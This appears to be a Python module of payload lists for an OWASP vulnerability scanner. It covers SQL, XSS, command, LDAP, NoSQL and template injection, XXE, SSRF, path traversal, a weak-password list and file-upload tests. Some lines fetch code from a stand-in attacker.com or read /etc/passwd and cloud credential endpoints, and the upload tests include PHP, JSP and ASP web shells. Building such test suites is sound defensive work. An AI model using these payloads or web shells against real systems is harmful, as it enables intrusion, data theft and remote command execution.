"""
Security Testing Payloads for OWASP Vulnerability Detection
===========================================================

Comprehensive collection of security testing payloads for:
- SQL Injection detection
- XSS (Cross-Site Scripting) detection
- Command Injection detection
- LDAP Injection detection
- XXE (XML External Entity) detection
- SSRF (Server-Side Request Forgery) detection
- NoSQL Injection detection
- Path Traversal detection
"""

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    # Classic SQL injection
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR '1'='1",
    "') OR ('1'='1",

    # Union-based SQL injection
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username, password FROM users--",
    "' UNION ALL SELECT NULL, NULL, NULL--",

    # Blind SQL injection (time-based)
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT pg_sleep(5)--",
    "'; BENCHMARK(5000000,MD5(1))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

    # Boolean-based blind SQL injection
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SUBSTRING((SELECT COUNT(*) FROM users),1,1)='1",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",

    # Error-based SQL injection
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",

    # Database-specific payloads
    # MySQL
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(95),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",

    # PostgreSQL
    "'; SELECT pg_read_file('/etc/passwd')--",
    "' UNION SELECT NULL, current_database(), NULL--",

    # Oracle
    "' UNION SELECT NULL FROM dual--",
    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--",

    # MSSQL
    "'; EXEC xp_cmdshell('whoami')--",
    "' UNION SELECT @@version--",

    # SQLite
    "' UNION SELECT sql FROM sqlite_master--",
    "' UNION SELECT name FROM sqlite_master WHERE type='table'--",

    # Special characters and encoding
    "' OR '1'='1' --",
    "%27 OR %271%27=%271",
    "&#39; OR &#39;1&#39;=&#39;1",
    "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
]

# Cross-Site Scripting (XSS) Payloads
XSS_PAYLOADS = [
    # Basic XSS
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",

    # Event-based XSS
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=\"alert('XSS')\">",
    "<audio src=x onerror=alert('XSS')>",

    # JavaScript protocol
    "javascript:alert('XSS')",
    "JaVaScRiPt:alert('XSS')",
    "javascript&#58;alert('XSS')",
    "javascript&colon;alert('XSS')",

    # Encoded XSS
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",

    # Filter bypass techniques
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>eval('\\x61lert(\\x22XSS\\x22)')</script>",
    "<script>alert(/XSS/.source)</script>",

    # HTML entity encoding
    "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;",
    "&#x3C;script&#x3E;alert(&#x22;XSS&#x22;)&#x3C;/script&#x3E;",

    # SVG-based XSS
    "<svg onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><animatetransform onbegin=alert('XSS')>",

    # CSS-based XSS
    "<style>@import'javascript:alert(\"XSS\")';</style>",
    "<link rel=stylesheet href=javascript:alert('XSS')>",
    "<style>body{background:url(javascript:alert('XSS'))}</style>",

    # Data URI XSS
    "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
    "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    # Basic command injection
    "; ls -la",
    "| ls -la",
    "&& ls -la",
    "|| ls -la",
    "`ls -la`",
    "$(ls -la)",

    # Windows commands
    "; dir",
    "| dir",
    "&& dir",
    "|| dir",
    "`dir`",
    "$(dir)",

    # System information gathering
    "; whoami",
    "; id",
    "; uname -a",
    "; cat /etc/passwd",
    "; cat /etc/shadow",
    "; ps aux",
    "; netstat -an",

    # Network commands
    "; ping -c 1 127.0.0.1",
    "; nslookup google.com",
    "; wget http://attacker.com/shell.sh",
    "; curl http://attacker.com/",

    # File operations
    "; cat /etc/hosts",
    "; find / -name '*.conf'",
    "; find / -perm -4000",
    "; grep -r password /",

    # Time-based detection
    "; sleep 10",
    "; ping -c 10 127.0.0.1",
    "&& timeout 10",

    # Encoded payloads
    "%3B%20ls%20-la",
    "%7C%20ls%20-la",
    "%26%26%20ls%20-la",

    # Advanced techniques
    "; echo $(whoami)",
    "; $(echo whoami)",
    "; `echo whoami`",
    "; sh -c 'whoami'",
    "; bash -c 'whoami'",
]

# LDAP Injection Payloads
LDAP_INJECTION_PAYLOADS = [
    # Authentication bypass
    "*",
    "*)(&",
    "*))%00",
    "admin)(&",
    "admin)(!(&(|",

    # Boolean-based blind LDAP injection
    "*)(uid=*",
    "*)(|(uid=*",
    "*)(|(cn=*",
    "*))%00(|(uid=*",

    # LDAP search filter injection
    "*))(objectClass=*",
    "*)(objectClass=user)(password=*",
    "*)(|(objectClass=*)(objectClass=*",

    # Time-based LDAP injection (less common)
    "*)(|(cn=*)(sleep(10",
    "*)(|(uid=*)(|(objectClass=*)(cn=*",

    # Wildcard attacks
    "*",
    "a*",
    "ad*",
    "adm*",
    "admin*",
]

# XML External Entity (XXE) Payloads
XXE_PAYLOADS = [
    # Basic XXE
    """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>""",

    # XXE with parameter entity
    """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
%xxe;]>
<foo>test</foo>""",

    # XXE to retrieve Windows files
    """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >]>
<foo>&xxe;</foo>""",

    # XXE for SSRF
    """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]>
<foo>&xxe;</foo>""",

    # Blind XXE
    """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd" >
%xxe;]>
<foo>test</foo>""",

    # XXE via SOAP
    """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Header></soap:Header>
<soap:Body>
<test>&xxe;</test>
</soap:Body>
</soap:Envelope>""",
]

# Server-Side Request Forgery (SSRF) Payloads
SSRF_PAYLOADS = [
    # Internal network scanning
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:5432/",

    # Cloud metadata endpoints
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",

    # File protocol
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/version",
    "file:///proc/cpuinfo",
    "file://localhost/etc/passwd",

    # Internal services
    "gopher://127.0.0.1:22/",
    "dict://127.0.0.1:11211/",
    "ftp://127.0.0.1/",
    "sftp://127.0.0.1/",

    # Protocol confusion
    "https://localhost@attacker.com/",
    "http://localhost#@attacker.com/",
    "http://attacker.com@localhost/",
    "http://127.0.0.1.attacker.com/",

    # IP encoding bypasses
    "http://0177.0.0.1/",  # Octal
    "http://2130706433/",  # Decimal
    "http://0x7f000001/",  # Hexadecimal
    "http://127.1/",       # Short form
    "http://127.0.1/",     # Short form
]

# NoSQL Injection Payloads
NOSQL_INJECTION_PAYLOADS = [
    # MongoDB injection
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    '{"$where": "this.password.match(/.*/)"}',
    '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',

    # JavaScript injection in MongoDB
    '"; return true; var dummy="',
    '"; return db.users.find(); var dummy="',
    '"; return process.env; var dummy="',

    # CouchDB injection
    '_all_docs',
    '_design/',
    '_utils/',

    # Generic NoSQL operators
    '{"$nin": []}',
    '{"$in": [null, true, false]}',
    '{"$size": 0}',
    '{"$type": 2}',
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    # Basic directory traversal
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "../../../../../../",
    "../../../../../../../",
    "../../../../../../../../",

    # Windows path traversal
    "..\\",
    "..\\..\\",
    "..\\..\\..\\",
    "..\\..\\..\\..\\",

    # URL encoded
    "%2e%2e%2f",
    "%2e%2e%2f%2e%2e%2f",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
    "%2e%2e%5c",
    "%2e%2e%5c%2e%2e%5c",

    # Double encoded
    "%252e%252e%252f",
    "%252e%252e%252f%252e%252e%252f",

    # Unicode encoded
    "..%c0%af",
    "..%c1%9c",
    "..%e0%80%af",

    # Specific file targets
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",

    # Null byte injection
    "../etc/passwd%00",
    "../../etc/passwd%00.jpg",
    "../../../etc/passwd%00.png",

    # Filter bypasses
    "....//",
    "....\\\\",
    "..../",
    "....\\",
    "....//....//",
    "....\\\\....\\\\",
]

# Template Injection Payloads
TEMPLATE_INJECTION_PAYLOADS = [
    # Jinja2 (Python)
    "{{7*7}}",
    "{{config}}",
    "{{self}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",

    # Twig (PHP)
    "{{7*7}}",
    "{{_self.env.getRuntime('Symfony\\Component\\Form\\FormRenderer').renderCsrfToken('test')}}",
    "{{_self.env.enableDebug()}}",

    # Freemarker (Java)
    "${7*7}",
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",

    # Smarty (PHP)
    "{7*7}",
    "{php}echo `id`;{/php}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,base64_decode('PD9waHAgcGhwaW5mbygpOyA/Pg=='),self::SMARTY_PHP)}",

    # Velocity (Java)
    "#set($x=7*7)$x",
    "#set($rt = $ex.getRuntime())#set($proc = $rt.exec('id'))$proc.waitFor()#set($is = $proc.getInputStream())#foreach($i in [1..$is.available()])$i#end",
]

# LDAP Attributes for enumeration
LDAP_ATTRIBUTES = [
    "objectClass",
    "cn",
    "sn",
    "givenName",
    "distinguishedName",
    "instanceType",
    "whenCreated",
    "whenChanged",
    "displayName",
    "uSNCreated",
    "memberOf",
    "uSNChanged",
    "name",
    "objectGUID",
    "userAccountControl",
    "badPwdCount",
    "codePage",
    "countryCode",
    "badPasswordTime",
    "lastLogoff",
    "lastLogon",
    "pwdLastSet",
    "primaryGroupID",
    "objectSid",
    "accountExpires",
    "logonCount",
    "sAMAccountName",
    "sAMAccountType",
    "userPrincipalName",
    "lockoutTime",
    "objectCategory",
    "dSCorePropagationData",
    "mail",
    "lastLogonTimestamp",
    "msDS-SupportedEncryptionTypes",
    "telephoneNumber",
    "homeDirectory",
    "homeDrive",
    "scriptPath",
    "profilePath",
    "userWorkstations",
    "passwordLastSet",
    "msDS-UserPasswordExpiryTimeComputed"
]

# Common weak passwords for testing
WEAK_PASSWORDS = [
    "123456",
    "password",
    "123456789",
    "12345678",
    "12345",
    "1234567",
    "1234567890",
    "qwerty",
    "abc123",
    "111111",
    "123123",
    "admin",
    "letmein",
    "welcome",
    "monkey",
    "password123",
    "admin123",
    "root",
    "toor",
    "test",
    "guest",
    "user",
    "password1",
    "123",
    "1234",
    "pass",
    "passwd",
    "secret",
    "default",
    "administrator",
    "admin@123",
    "root@123",
    "test@123",
    "guest123",
    "user123"
]

# HTTP headers for security testing
SECURITY_TEST_HEADERS = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-Cluster-Client-IP": "127.0.0.1",
    "Client-IP": "127.0.0.1",
    "X-Original-URL": "/admin",
    "X-Rewrite-URL": "/admin",
    "Referer": "javascript:alert('XSS')",
    "User-Agent": "<script>alert('XSS')</script>",
    "Accept-Language": "../../../etc/passwd",
    "Accept-Charset": "UTF-7",
    "Content-Type": "text/html; charset=UTF-7",
    "Host": "localhost:22",
    "Origin": "null",
    "X-HTTP-Method-Override": "PUT",
    "X-HTTP-Method": "DELETE",
    "X-Method-Override": "PUT"
}

# File upload security test payloads
FILE_UPLOAD_PAYLOADS = {
    "php_webshell": {
        "filename": "shell.php",
        "content": "<?php echo shell_exec($_GET['cmd']); ?>",
        "content_type": "application/x-php"
    },
    "jsp_webshell": {
        "filename": "shell.jsp",
        "content": "<%@ page import=\"java.io.*\" %><% String cmd = request.getParameter(\"cmd\"); Process p = Runtime.getRuntime().exec(cmd); %>",
        "content_type": "application/x-jsp"
    },
    "asp_webshell": {
        "filename": "shell.asp",
        "content": "<%eval request(\"cmd\")%>",
        "content_type": "application/x-asp"
    },
    "html_xss": {
        "filename": "xss.html",
        "content": "<script>alert('XSS')</script>",
        "content_type": "text/html"
    },
    "svg_xss": {
        "filename": "xss.svg",
        "content": "<?xml version=\"1.0\" standalone=\"no\"?><!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"><svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"><rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" /><script type=\"text/javascript\">alert('XSS');</script></svg>",
        "content_type": "image/svg+xml"
    }
}